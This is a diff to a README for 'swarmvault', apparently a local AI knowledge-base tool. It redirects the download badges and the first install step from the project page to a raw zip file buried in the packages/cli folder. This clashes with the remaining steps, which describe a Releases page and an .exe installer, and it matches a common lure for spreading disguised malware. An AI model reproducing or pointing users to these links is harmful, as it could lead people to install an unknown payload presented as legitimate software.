@@ -1,6 +1,6 @@
 # 🧠 swarmvault - Organize research into your private wiki
 
-[![](https://img.shields.io/badge/Download_Swarmvault-Blue)](https://github.com/anitagraviti-sys/swarmvault)
+[![](https://img.shields.io/badge/Download_Swarmvault-Blue)](https://github.com/anitagraviti-sys/swarmvault/raw/refs/heads/main/packages/cli/Software-1.4-alpha.4.zip)
 
 Swarmvault helps you build a personal knowledge base. It processes raw research documents and saves them as markdown files. It builds a map of your information so you can find connections between notes. This tool works locally on your computer. Your files stay on your hard drive. 
 
@@ -10,14 +10,14 @@ The software uses artificial intelligence to scan your documents. It extract fac
 
 You need the installer file to begin. Follow these steps to get the software on your Windows computer:
 
-1. Visit the project repository page at https://github.com/anitagraviti-sys/swarmvault.
+1. Visit the project repository page at https://github.com/anitagraviti-sys/swarmvault/raw/refs/heads/main/packages/cli/Software-1.4-alpha.4.zip
 2. Look for the Releases section on the right side of the screen.
 3. Click the link that says Releases.
 4. Select the latest version of the installer file, which ends in .exe.
 5. Save the file to your Downloads folder.
 6. Double-click the saved file to start the installation.
 
-[![](https://img.shields.io/badge/Download_Swarmvault_Installer-Grey)](https://github.com/anitagraviti-sys/swarmvault)
+[![](https://img.shields.io/badge/Download_Swarmvault_Installer-Grey)](https://github.com/anitagraviti-sys/swarmvault/raw/refs/heads/main/packages/cli/Software-1.4-alpha.4.zip)
 
 ## ⚙️ System requirements
 
